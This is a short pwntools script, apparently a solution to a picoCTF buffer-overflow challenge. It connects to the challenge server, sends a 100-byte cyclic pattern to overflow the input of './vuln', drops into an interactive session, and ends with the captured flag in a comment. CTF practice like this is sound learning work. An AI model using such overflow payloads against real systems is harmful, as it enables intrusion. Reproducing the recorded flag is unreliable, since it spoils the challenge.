from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main
continue
'''.format(**locals())

exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
# p = start()

r = remote("saturn.picoctf.net", 65355)
r.sendlineafter(b"Input: ", cyclic(100))

r.interactive()

# picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}
